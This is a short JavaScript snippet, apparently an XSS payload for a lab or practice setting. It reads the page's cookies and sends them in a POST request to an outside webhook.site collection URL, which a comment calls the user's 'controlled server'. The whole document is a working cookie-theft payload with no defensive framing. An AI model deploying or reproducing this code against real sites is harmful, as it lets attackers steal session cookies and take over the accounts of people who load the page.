
// Collect the document's cookies
const cookies = document.cookie;

// Send them to your controlled server (e.g. https://your-lab-server.com/log)
fetch('https://webhook.site/57735cd2-fefa-4d20-ad45-36f3b6577d4b', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ cookie: cookies })
});
